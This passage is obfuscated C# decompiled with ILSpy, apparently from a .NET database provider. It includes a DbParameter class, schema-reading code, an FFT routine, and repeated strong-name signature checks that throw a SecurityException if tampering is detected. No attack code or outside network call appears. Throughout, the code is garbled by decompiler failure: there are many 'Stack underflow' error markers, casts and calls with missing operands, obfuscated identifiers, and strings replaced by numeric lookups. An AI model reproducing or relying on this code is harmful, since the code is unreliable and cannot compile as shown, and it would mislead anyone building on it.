					_0084_0005._007E_0014_000F(binaryWriter, _0018._0001(0u));
					long num2 = _0002._0001;
					global::_0017._0016._0001(list, new global::_0012._000E());
					_ = list.Count;
					_ = 0;
					IEnumerator<global::_0013._0010> enumerator = list.GetEnumerator();
					try
					{
						while (global::_001B._007E_0086_0003(enumerator))
						{
							enumerator.Current._0001(ref num2, binaryWriter);
						}
					}
					finally
					{
						if (enumerator != null)
						{
							global::_0008._007E_0098(enumerator);
						}
					}
					uint num3 = (uint)((int)(global::_0012._007E_0091_0002(_0005_0003._007E_0081_0006(binaryWriter)) - num) - 4);
					_007F_0002._007E_0083_0005(_0005_0003._007E_0081_0006(binaryWriter), num);
					_0084_0005._007E_0014_000F(binaryWriter, _0018._0001(num3));
					_007F_0002 obj = _007F_0002._007E_0083_0005;
					Stream stream = _0005_0003._007E_0081_0006(binaryWriter);
					obj(stream, stream.Position + num3);
				}
			}
			finally
			{
				if (binaryWriter != null)
				{
					global::_0008._007E_0098(binaryWriter);
				}
			}
		}

		static void _0001(int _0002, bool _0003, global::_0013._0014[] _0004)
		{
			//IL_0014: Unknown result type (might be due to invalid IL or missing references)
			//IL_0016: Expected I4, but got Unknown
			//IL_0265: Incompatible stack heights: 0 vs 1
			int num = 1;
			for (int i = 0; i < _0002; i++)
			{
				num = /*Error near IL_0015: Stack underflow*/* 2;
			}
			int num2 = num >> 1;
			int num3 = 0;
			for (int i = 0; i < num - 1; i++)
			{
				if (i < num3)
				{
					float num4 = _0004[i]._0001;
					float num5 = _0004[i]._0002;
					_0004[i]._0001 = _0004[num3]._0001;
					_0004[i]._0002 = _0004[num3]._0002;
					_0004[num3]._0001 = num4;
					_0004[num3]._0002 = num5;
				}
				int num6;
				for (num6 = num2; num6 <= num3; num6 >>= 1)
				{
					num3 -= num6;
				}
				num3 += num6;
			}
			float num7 = -1f;
			float num8 = 0f;
			int num9 = 1;
			for (int j = 0; j < _0002; j++)
			{
				int num10 = num9;
				num9 <<= 1;
				float num11 = 1f;
				float num12 = 0f;
				for (num3 = 0; num3 < num10; num3++)
				{
					for (int i = num3; i < num; i += num9)
					{
						int num13 = i + num10;
						float num14 = num11 * _0004[num13]._0001 - num12 * _0004[num13]._0002;
						float num15 = num11 * _0004[num13]._0002 + num12 * _0004[num13]._0001;
						_0004[num13]._0001 = _0004[i]._0001 - num14;
						_0004[num13]._0002 = _0004[i]._0002 - num15;
						_0004[i]._0001 += num14;
						_0004[i]._0002 += num15;
					}
					float num16 = num11 * num7 - num12 * num8;
					num12 = num11 * num8 + num12 * num7;
					num11 = num16;
				}
				num8 = (float)global::_0015._009F_0002((1f - num7) / 2f);
				if (_0003)
				{
					num8 = 0f - num8;
				}
				num7 = (float)global::_0015._009F_0002((1f + num7) / 2f);
			}
			if (_0003)
			{
				for (int i = 0; i < num; i++)
				{
					_0004[i]._0001 /= num;
					_0004[i]._0002 /= num;
				}
			}
		}

		static object _0001(Type _0002, string _0003, bool _0004)
		{
			//IL_001d: Incompatible stack heights: 0 vs 2
			//IL_0027: Incompatible stack heights: 0 vs 2
			//IL_002e: Incompatible stack heights: 0 vs 1
			_ = global::_001C._0096_0003;
			/*Error near IL_002e: Stack underflow*/((string)/*Error near IL_002e: Stack underflow*/);
			if ((int)/*Error near IL_000b: Stack underflow*/ == 0)
			{
				try
				{
					_ = _0017_0007._0008_0011;
					return /*Error near IL_0019: Stack underflow*/((Type)/*Error near IL_0019: Stack underflow*/, _0003, _0004);
				}
				catch
				{
				}
			}
			return null;
		}

		static global::_0017._0017 _0001(int _0002, int _0003, int _0004)
		{
			//IL_000b: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0015: Expected I4, but got Unknown
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 2
			_0018._0001((int)/*Error near IL_001e: Stack underflow*/);
			_ = 176;
			return new global::_0017._0017(/*Error near IL_000c: Stack underflow*/ + /*Error near IL_000c: Stack underflow*/- 1, _0003, _0004);
		}

		static void _0001()
		{
			try
			{
				_0018._0001();
			}
			catch (Exception)
			{
			}
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static long? _0001(_001F._0019 _0002, string _0003, string P_2)
		{
			//IL_00a7: Incompatible stack heights: 0 vs 1
			//IL_00ad: Incompatible stack heights: 0 vs 1
			//IL_00b3: Incompatible stack heights: 0 vs 1
			if (((_001F._0019)/*Error near IL_000a: Stack underflow*/)._0001 != null && (int)/*Error near IL_0019: Stack underflow*/ != 0 && (int)/*Error near IL_0020: Stack underflow*/ != 0)
			{
				for (int i = 0; i < _0002._0001.Length; i++)
				{
					if (_0002._0001[i]._0001 == _0003 && _0002._0001[i]._0002 == P_2)
					{
						long num = _0002._0001._0001._0002(_0002._0001, _0002._0001[i]._0003);
						if (num != 0)
						{
							return num;
						}
					}
				}
			}
			return null;
		}

		static void _0001(global::_0004._0001 P_0)
		{
			//IL_0059: Incompatible stack heights: 0 vs 1
			//IL_0066: Incompatible stack heights: 0 vs 1
			_0016_0005._009F_000E();
			DateTime value = (DateTime)/*Error near IL_0069: Stack underflow*/;
			try
			{
				TimeSpan timeSpan = ((global::_0004._0001)/*Error near IL_0012: Stack underflow*/)._0001.Subtract(value);
				if (_0018_0007._000E_0011(timeSpan.Minutes) > 6)
				{
					global::_0008._007E_0081_0002(P_0._0001._0001);
					P_0._0001._0007 = false;
				}
			}
			catch
			{
			}
		}

		static void _0001(global::_0007._0014 P_0)
		{
			//IL_000c: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 1
			((global::_0007._0014)/*Error near IL_0007: Stack underflow*/)._0001._0002();
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static NetworkStream _0001(global::_0004._0001 _0002, TcpClient P_1)
		{
			//IL_0011: Incompatible stack heights: 0 vs 2
			//IL_0018: Incompatible stack heights: 0 vs 1
			_ = _0019_0007._007E_000F_0011;
			/*Error near IL_0018: Stack underflow*/((object)/*Error near IL_0018: Stack underflow*/);
			return (NetworkStream)/*Error near IL_000e: Stack underflow*/;
		}
	}
}
namespace _0001
{
	internal enum _001E
	{
		_0001 = 1,
		_0002 = 2,
		_0003 = 3,
		_0004 = 0
	}
}
namespace _001E
{
	internal enum _0015
	{
		_0001 = 1,
		_0002,
		_0003
	}
}
namespace _0011
{
	internal struct _0015
	{
		public string _0001;

		public global::_0001._001E _0001;

		public _001E._0015 _0001;

		internal global::_0012._0014 _0001;

		public int _0001(string _0002, string _0003)
		{
			//IL_0028: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 2
			//IL_002e: Incompatible stack heights: 0 vs 2
			_ = ((_0015)/*Error near IL_0007: Stack underflow*/)._0001._0001;
			_ = ((_0015)/*Error near IL_0013: Stack underflow*/)._0001;
			IntPtr intPtr = ((_0015)/*Error near IL_001a: Stack underflow*/)._0001._0001;
			return ((_0013)/*Error near IL_0026: Stack underflow*/)._0001((_001E._0015)/*Error near IL_0026: Stack underflow*/, intPtr, _0002, _0003);
		}

		public int _0001(char[] _0002, char[] _0003)
		{
			//IL_0028: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 2
			//IL_002e: Incompatible stack heights: 0 vs 2
			_ = ((_0015)/*Error near IL_0007: Stack underflow*/)._0001._0001;
			_ = ((_0015)/*Error near IL_0013: Stack underflow*/)._0001;
			IntPtr intPtr = ((_0015)/*Error near IL_001a: Stack underflow*/)._0001._0001;
			return ((_0013)/*Error near IL_0026: Stack underflow*/)._0001((_001E._0015)/*Error near IL_0026: Stack underflow*/, intPtr, _0002, _0003);
		}
	}
}
namespace _0019
{
	[AttributeUsage(AttributeTargets.Class, Inherited = false, AllowMultiple = true)]
	internal sealed class _007F : Attribute
	{
		internal string _0001;

		internal int _0001;

		internal global::_0016._001C _0001;

		internal Type _0001;

		internal Delegate _0001;

		internal Delegate _0002;

		public string Name
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_007F)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_007F)/*Error near IL_0009: Stack underflow*/)._0001 = (string)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public int Arguments
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_007F)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_007F)/*Error near IL_0009: Stack underflow*/)._0001 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public global::_0016._001C FuncType
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_007F)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_007F)/*Error near IL_0009: Stack underflow*/)._0001 = (global::_0016._001C)/*Error near IL_0009: Stack underflow*/;
			}
		}

		internal Type InstanceType
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_007F)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_007F)/*Error near IL_0009: Stack underflow*/)._0001 = (Type)/*Error near IL_0009: Stack underflow*/;
			}
		}

		internal Delegate Callback1
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_007F)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_007F)/*Error near IL_0009: Stack underflow*/)._0001 = (Delegate)/*Error near IL_0009: Stack underflow*/;
			}
		}

		internal Delegate Callback2
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_007F)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_007F)/*Error near IL_0009: Stack underflow*/)._0002 = (Delegate)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public _007F()
			: this(null, -1, global::_0016._001C._0001)
		{
		}

		public _007F(string _0004_001F, int _009C_0015_0006, global::_0016._001C _009B_001E_0006)
		{
			this._0001 = _0004_001F;
			this._0001 = _009C_0015_0006;
			this._0001 = _009B_001E_0006;
			this._0001 = null;
			_0001 = null;
			_0002 = null;
		}
	}
}
namespace _001F
{
	internal sealed class _0019 : IDisposable
	{
		internal struct _0001
		{
			internal string _0001;

			internal string _0002;

			internal string _0003;

			internal int _0001;

			internal int _0002;

			internal int _0003;

			internal _0003 _0001;

			internal int _0004;
		}

		internal struct _0002
		{
			internal string _0001;

			internal string _0002;

			internal int _0001;
		}

		internal sealed class _0003 : IDisposable
		{
			internal global::_0010._001C _0001;

			internal global::_0011._0014 _0001;

			internal bool _0001;

			internal bool IsValid
			{
				set
				{
					//IL_0029: Incompatible stack heights: 0 vs 1
					//IL_0030: Incompatible stack heights: 0 vs 1
					//IL_0033: Incompatible stack heights: 0 vs 1
					if ((int)/*Error near IL_0004: Stack underflow*/ != 0)
					{
						new ArgumentException();
						throw /*Error near IL_0007: Stack underflow*/;
					}
					if (((_0003)/*Error near IL_000e: Stack underflow*/)._0001 != null)
					{
						global::_0008._007E_0082_0002(this._0001);
						this._0001 = null;
					}
				}
			}

			internal _0003(global::_0017._0080 _0002_0014_0006, string _0096_0014_0006, string _008E_0014_0006, params string[] _008C_001F_0006)
			{
				using (_001D._0019 obj = new _001D._0019())
				{
					this._0001 = global::_0011._0018._0001(_0002_0014_0006);
					for (int i = 0; i < _008C_001F_0006.Length; i++)
					{
						_008C_001F_0006[i] = obj.QuoteIdentifier(_008C_001F_0006[i]);
					}
				}
				this._0001.CommandText = global::_0011._0018._0001((IFormatProvider)CultureInfo.InvariantCulture, _0080._0014._0001(107375692), new object[3]
				{
					string.Join(_0080._0014._0001(107375631), _008C_001F_0006),
					_0096_0014_0006,
					_008E_0014_0006
				});
				global::_0011._0018._0001((object)0L, (string)null, this._0001.Parameters);
			}

			public void _0001()
			{
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001d: Incompatible stack heights: 0 vs 2
				global::_0011._0018._0001((_0003)/*Error near IL_001a: Stack underflow*/, true);
				_ = _0091_0002._009B_0005;
				/*Error near IL_0011: Stack underflow*/((object)/*Error near IL_0011: Stack underflow*/);
			}

			void IDisposable.Dispose()
			{
				//ILSpy generated this explicit interface implementation from .override directive in 
				this._0001();
			}

			protected override void _0002()
			{
				//IL_0008: Incompatible stack heights: 0 vs 1
				try
				{
					global::_0011._0018._0001((_0003)/*Error near IL_000f: Stack underflow*/, false);
				}
				finally
				{
					global::_0008._009E(this);
				}
			}
		}

		internal _0001[] _0001;

		internal global::_0013._0017 _0001;

		internal bool _0001;

		internal _0002[] _0001;

		internal bool _0002;

		internal int Count
		{
			get
			{
				//IL_0016: Incompatible stack heights: 0 vs 1
				//IL_0019: Incompatible stack heights: 0 vs 1
				if (((_0019)/*Error near IL_0007: Stack underflow*/)._0001 != null)
				{
					return ((_0019)/*Error near IL_0010: Stack underflow*/)._0001.Length;
				}
				return 0;
			}
		}

		internal _0019(global::_0017._0080 _0002_0014_0006, global::_0011._0014 _009B_008E, global::_0013._0017 _0008_0014_0006)
		{
			Dictionary<string, int> dictionary = new Dictionary<string, int>();
			Dictionary<string, List<string>> dictionary2 = new Dictionary<string, List<string>>();
			List<_0001> list = new List<_0001>();
			List<_0002> list2 = new List<_0002>();
			this._0001 = _0008_0014_0006;
			using (DataTable dataTable = _0002_0014_0006.GetSchema(_0080._0014._0001(107401820)))
			{
				foreach (DataRow row in dataTable.Rows)
				{
					dictionary.Add((string)row[_0080._0014._0001(107356658)], Convert.ToInt32(row[_0080._0014._0001(107356609)], CultureInfo.InvariantCulture));
				}
			}
			using (DataTable dataTable2 = global::_0011._0018._0001(_009B_008E, false, false))
			{
				foreach (DataRow row2 in dataTable2.Rows)
				{
					if (row2[SchemaTableOptionalColumn.BaseCatalogName] != DBNull.Value)
					{
						string key = (string)row2[SchemaTableOptionalColumn.BaseCatalogName];
						string item = (string)row2[SchemaTableColumn.BaseTableName];
						List<string> list3;
						if (!dictionary2.ContainsKey(key))
						{
							list3 = new List<string>();
							dictionary2.Add(key, list3);
						}
						else
						{
							list3 = dictionary2[key];
						}
						if (!list3.Contains(item))
						{
							list3.Add(item);
						}
					}
				}
				foreach (KeyValuePair<string, List<string>> item2 in dictionary2)
				{
					for (int i = 0; i < item2.Value.Count; i++)
					{
						string text = item2.Value[i];
						DataRow dataRow3 = null;
						using DataTable dataTable3 = _0002_0014_0006.GetSchema(_0080._0014._0001(107358997), new string[3] { item2.Key, null, text });
						for (int j = 0; j < 2; j++)
						{
							if (dataRow3 != null)
							{
								break;
							}
							foreach (DataRow row3 in dataTable3.Rows)
							{
								if (j == 0 && (bool)row3[_0080._0014._0001(107358899)])
								{
									dataRow3 = row3;
									break;
								}
								if (j == 1 && (bool)row3[_0080._0014._0001(107358816)])
								{
									dataRow3 = row3;
									break;
								}
							}
						}
						if (dataRow3 == null)
						{
							item2.Value.RemoveAt(i);
							i--;
							continue;
						}
						using DataTable dataTable4 = _0002_0014_0006.GetSchema(_0080._0014._0001(107355256), new string[3] { item2.Key, null, text });
						int num = dictionary[item2.Key];
						int num2 = Convert.ToInt32(dataTable4.Rows[0][_0080._0014._0001(107355217)], CultureInfo.InvariantCulture);
						int num3 = _0008_0014_0006._0001._0001(_0008_0014_0006, num, num2);
						using DataTable dataTable5 = _0002_0014_0006.GetSchema(_0080._0014._0001(107362428), new string[4]
						{
							item2.Key,
							null,
							text,
							(string)dataRow3[_0080._0014._0001(107362723)]
						});
						bool flag = (string)dataRow3[_0080._0014._0001(107362723)] == _0080._0014._0001(107375717) + text;
						_0003 obj = null;
						List<string> list4 = new List<string>();
						for (int k = 0; k < dataTable5.Rows.Count; k++)
						{
							string text2 = global::_0011._0018._0001(dataTable5.Rows[k][_0080._0014._0001(107362765)]);
							bool flag2 = true;
							foreach (DataRow row4 in dataTable2.Rows)
							{
								if (!row4.IsNull(SchemaTableColumn.BaseColumnName) && (string)row4[SchemaTableColumn.BaseColumnName] == text2 && (string)row4[SchemaTableColumn.BaseTableName] == text && (string)row4[SchemaTableOptionalColumn.BaseCatalogName] == item2.Key)
								{
									if (flag)
									{
										list2.Add(new _0002
										{
											_0001 = item2.Key,
											_0002 = text,
											_0001 = (int)row4[SchemaTableColumn.ColumnOrdinal]
										});
									}
									dataTable5.Rows.RemoveAt(k);
									k--;
									flag2 = false;
									break;
								}
							}
							if (flag2)
							{
								list4.Add(text2);
							}
						}
						if (!flag && list4.Count > 0)
						{
							string[] array = new string[list4.Count];
							list4.CopyTo(array);
							obj = new _0003(_0002_0014_0006, item2.Key, text, array);
						}
						for (int l = 0; l < dataTable5.Rows.Count; l++)
						{
							string text3 = global::_0011._0018._0001(dataTable5.Rows[l][_0080._0014._0001(107362765)]);
							list.Add(new _0001
							{
								_0002 = num2,
								_0003 = num3,
								_0001 = num,
								_0001 = item2.Key,
								_0002 = text,
								_0003 = text3,
								_0001 = obj,
								_0004 = l
							});
						}
					}
				}
			}
			this._0001 = new _0001[list.Count];
			list.CopyTo(this._0001);
			this._0001 = new _0002[list2.Count];
			list2.CopyTo(this._0001);
		}

		public void _0001()
		{
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 2
			global::_0011._0018._0001((_0019)/*Error near IL_001a: Stack underflow*/, true);
			_ = _0091_0002._009B_0005;
			/*Error near IL_0011: Stack underflow*/((object)/*Error near IL_0011: Stack underflow*/);
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001();
		}

		protected override void _0002()
		{
			//IL_0008: Incompatible stack heights: 0 vs 1
			try
			{
				global::_0011._0018._0001((_0019)/*Error near IL_000f: Stack underflow*/, false);
			}
			finally
			{
				global::_0008._009E(this);
			}
		}

		static _0019()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0008
{
	internal sealed class _0012 : EventArgs
	{
		public readonly object _0001;

		public readonly string _0001;

		public readonly object _0002;

		internal _0012(IntPtr _0008_001B_0006, object _001E_001E_0006, string _001F_001E_0006, object _0087_000F)
		{
			this._0001 = _001E_001E_0006;
			_0001 = _001F_001E_0006;
			_0002 = _0087_000F;
		}

		static _0012()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0010
{
	internal delegate void _001F(object sender, global::_0008._0012 e);
}
namespace _0015
{
	internal static class _0016
	{
		internal static object _0001;

		internal static EventHandler _0001;

		internal static global::_0010._001F _0001;

		internal static global::_0010._001F _0002;

		internal static _0015 _0001;

		internal static global::_0011._0013 _0001;

		internal static bool _0001;

		public static bool Enabled
		{
			get
			{
				_0091_0002 obj = _0091_0002._009C_0005;
				object obj2 = _0016._0001;
				object obj3 = default(object);
				if (0 == 0)
				{
					obj3 = obj2;
				}
				obj(obj2);
				try
				{
					return _0001;
				}
				finally
				{
					_0091_0002._009D_0005(obj3);
				}
			}
			set
			{
				//IL_0019: Incompatible stack heights: 0 vs 1
				//IL_0029: Incompatible stack heights: 0 vs 2
				_ = _0091_0002._009C_0005;
				object obj = _0016._0001;
				/*Error near IL_0030: Stack underflow*/((object)/*Error near IL_0030: Stack underflow*/);
				try
				{
					_0001 = (byte)/*Error near IL_0016: Stack underflow*/ != 0;
				}
				finally
				{
					_0091_0002._009D_0005(obj);
				}
			}
		}

		private static event global::_0010._001F _handlers
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				//IL_001a: Incompatible stack heights: 0 vs 3
				//IL_0021: Incompatible stack heights: 0 vs 1
				_ = _0005_0002._009F_0004;
				_ = _0016._0001;
				/*Error near IL_0021: Stack underflow*/((Delegate)/*Error near IL_0021: Stack underflow*/, (Delegate)/*Error near IL_0021: Stack underflow*/);
				_0016._0001 = (global::_0010._001F)/*Error near IL_000f: Stack underflow*/;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				//IL_001a: Incompatible stack heights: 0 vs 3
				//IL_0021: Incompatible stack heights: 0 vs 1
				_ = _0005_0002._0001_0005;
				_ = _0016._0001;
				/*Error near IL_0021: Stack underflow*/((Delegate)/*Error near IL_0021: Stack underflow*/, (Delegate)/*Error near IL_0021: Stack underflow*/);
				_0016._0001 = (global::_0010._001F)/*Error near IL_000f: Stack underflow*/;
			}
		}

		public static event global::_0010._001F Log
		{
			add
			{
				//IL_0047: Incompatible stack heights: 0 vs 3
				//IL_0057: Incompatible stack heights: 0 vs 2
				_ = _0091_0002._009C_0005;
				object obj = _0016._0001;
				/*Error near IL_005e: Stack underflow*/((object)/*Error near IL_005e: Stack underflow*/);
				try
				{
					_ = _0005_0002._0001_0005;
					_ = _0016._0001;
					_0016._0001 = (global::_0010._001F)/*Error near IL_0020: Stack underflow*/((Delegate)/*Error near IL_0020: Stack underflow*/, (Delegate)/*Error near IL_0020: Stack underflow*/);
					_0016._0001 = (global::_0010._001F)_0005_0002._009F_0004(_0016._0001, value);
				}
				finally
				{
					_0091_0002._009D_0005(obj);
				}
			}
			remove
			{
				//IL_002d: Incompatible stack heights: 0 vs 3
				//IL_003d: Incompatible stack heights: 0 vs 2
				_ = _0091_0002._009C_0005;
				object obj = _0016._0001;
				/*Error near IL_0044: Stack underflow*/((object)/*Error near IL_0044: Stack underflow*/);
				try
				{
					_ = _0005_0002._0001_0005;
					_ = _0016._0001;
					_0016._0001 = (global::_0010._001F)/*Error near IL_0020: Stack underflow*/((Delegate)/*Error near IL_0020: Stack underflow*/, (Delegate)/*Error near IL_0020: Stack underflow*/);
				}
				finally
				{
					_0091_0002._009D_0005(obj);
				}
			}
		}

		static _0016()
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			new object();
			_0016._0001 = (object)/*Error near IL_0007: Stack underflow*/;
		}
	}
}
namespace _0005
{
	internal static class _0018
	{
		public static readonly string _0001;

		public static readonly string _0002;

		public static readonly string _0003;

		public static readonly string _0004;

		public static readonly string _0005;

		public static readonly string _0006;

		public static readonly string _0007;

		public static readonly string _0008;

		public static readonly string _000E;

		static _0018()
		{
			//IL_0140: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly = (Assembly)/*Error near IL_0146: Stack underflow*/;
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (!global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) || !flag || !global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				throw new SecurityException(_0080._0014._0001(107396706));
			}
			_0001 = _0080._0014._0001(107401820);
			_0002 = _0080._0014._0001(107359381);
			_0003 = _0080._0014._0001(107358997);
			_0004 = _0080._0014._0001(107362428);
			_0005 = _0080._0014._0001(107355256);
			_0006 = _0080._0014._0001(107380203);
			_0007 = _0080._0014._0001(107357646);
			_0008 = _0080._0014._0001(107352059);
			_000E = _0080._0014._0001(107357450);
		}
	}
}
namespace _0011
{
	internal sealed class _0016 : DbParameter, ICloneable
	{
		private const DbType _0001 = (DbType)(-1);

		private IDbCommand _0001;

		internal DbType _0002;

		private DataRowVersion _0001;

		private object _0001;

		private string _0001;

		private string m__0002;

		private int _0001;

		private bool _0001;

		private bool m__0002;

		internal string _0003;

		public IDbCommand Command
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0016)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0016)/*Error near IL_0009: Stack underflow*/)._0001 = (IDbCommand)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public override bool IsNullable
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0016)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0016)/*Error near IL_0009: Stack underflow*/)._0001 = (byte)/*Error near IL_0009: Stack underflow*/ != 0;
			}
		}

		[RefreshProperties(RefreshProperties.All)]
		[DbProviderSpecificTypeProperty(true)]
		public override DbType DbType
		{
			get
			{
				//IL_0042: Incompatible stack heights: 0 vs 1
				//IL_0045: Incompatible stack heights: 0 vs 1
				//IL_0048: Incompatible stack heights: 0 vs 1
				if (((_0016)/*Error near IL_0007: Stack underflow*/)._0002 == (DbType)(-1))
				{
					if (((_0016)/*Error near IL_0011: Stack underflow*/)._0001 != null && ((_0016)/*Error near IL_001a: Stack underflow*/)._0001 != DBNull.Value)
					{
						return _0018._0001(_001D_0003._007E_009D_0006(this._0001));
					}
					return DbType.String;
				}
				return this._0002;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0016)/*Error near IL_0009: Stack underflow*/)._0002 = (DbType)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public override ParameterDirection Direction
		{
			get
			{
				return ParameterDirection.Input;
			}
			set
			{
				//IL_0003: Invalid comparison between Unknown and I4
				//IL_000a: Incompatible stack heights: 0 vs 1
				//IL_0011: Incompatible stack heights: 0 vs 1
				if ((int)/*Error near IL_0005: Stack underflow*/ != 1)
				{
					new NotSupportedException();
					throw /*Error near IL_0008: Stack underflow*/;
				}
			}
		}

		public override string ParameterName
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0016)/*Error near IL_0007: Stack underflow*/).m__0002;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0016)/*Error near IL_0009: Stack underflow*/).m__0002 = (string)/*Error near IL_0009: Stack underflow*/;
			}
		}

		[DefaultValue(0)]
		public override int Size
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0016)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0016)/*Error near IL_0009: Stack underflow*/)._0001 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public override string SourceColumn
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0016)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0016)/*Error near IL_0009: Stack underflow*/)._0001 = (string)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public override bool SourceColumnNullMapping
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0016)/*Error near IL_0007: Stack underflow*/).m__0002;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0016)/*Error near IL_0009: Stack underflow*/).m__0002 = (byte)/*Error near IL_0009: Stack underflow*/ != 0;
			}
		}

